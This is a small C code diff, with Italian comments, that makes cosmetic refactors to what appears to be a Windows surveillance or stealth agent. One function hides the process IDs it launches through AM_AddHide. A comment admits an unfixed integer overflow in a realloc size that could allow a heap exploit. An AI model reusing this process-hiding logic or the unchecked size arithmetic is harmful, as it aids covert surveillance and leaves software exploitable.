@@ -322,7 +322,6 @@ void DispatchEvent(DWORD event_id)
 // Torna FALSE solo se ha inserito con successo una azione slow
 BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *param)
 {
-	void *temp_action_list;
 	BOOL is_fast_action;
 	DWORD subaction_count;
 
@@ -334,16 +333,16 @@ BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *par
 
 	// All'inizio subaction_list e subaction_count sono a 0 perche' azzerate nella ActionTableInit
 	// XXX si, c'e' un int overflow se ci sono 2^32 sotto azioni che potrebbe portare a un exploit nello heap (es: double free)....
-	temp_action_list = realloc(entry->subaction_list, sizeof(ACTION_ELEM) * (entry->subaction_count + 1) );
+	void *dst = realloc(entry->subaction_list, sizeof(ACTION_ELEM) * (entry->subaction_count + 1) );
 
 	// Se non riesce ad aggiungere la nuova sottoazione lascia tutto com'e'
-	if (!temp_action_list)
+	if (!dst)
 		return TRUE;
 
 	// Se l'array delle sottoazioni e' stato ampliato con successo, incrementa il numero delle sottoazioni
 	// e aggiunge la nuova subaction
 	subaction_count = entry->subaction_count++;
-	entry->subaction_list = (ACTION_ELEM *)temp_action_list;
+	entry->subaction_list = (ACTION_ELEM *)dst;
 	entry->subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type, &is_fast_action);
 
 	entry->subaction_list[subaction_count].param = param;
@@ -633,7 +632,6 @@ void SM_HandleExecutedProcess()
 // Ne effettua anche l'hiding
 void SM_AddExecutedProcess(DWORD pid)
 {
-	DWORD i;
 	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 
 	// Aggiorna la lista dei PID eseguiti (se e' allocata)
@@ -645,7 +643,7 @@ void SM_AddExecutedProcess(DWORD pid)
 	AM_AddHide(HIDE_PID, &pid_hide);
 
 	// Cerca un posto libero e inserisce il PID
-	for (i=0; i<MAX_PROCESS_EXECUTED; i++)
+	for (DWORD i=0; i<MAX_PROCESS_EXECUTED; i++)
 		if (!process_executed[i]) {
 			process_executed[i] = pid;
 			break;
